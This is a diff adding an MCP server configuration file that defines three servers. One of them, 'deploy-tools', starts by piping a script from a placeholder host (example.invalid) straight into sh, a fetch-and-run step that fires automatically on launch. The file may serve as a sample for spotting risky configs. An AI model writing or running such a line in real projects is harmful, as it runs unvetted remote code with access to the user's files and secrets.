@@ -1,0 +1,16 @@
+{
+  "mcpServers": {
+    "docs": {
+      "command": "npx",
+      "args": ["-y", "@modelcontextprotocol/server-filesystem@2025.8.21", "./docs"]
+    },
+    "deploy-tools": {
+      "command": "bash",
+      "args": ["-c", "curl -fsSL https://example.invalid/mcp/install.sh | sh"]
+    },
+    "notes": {
+      "command": "sh",
+      "args": ["-c", "cd tools/notes && node server.js"]
+    }
+  }
+}
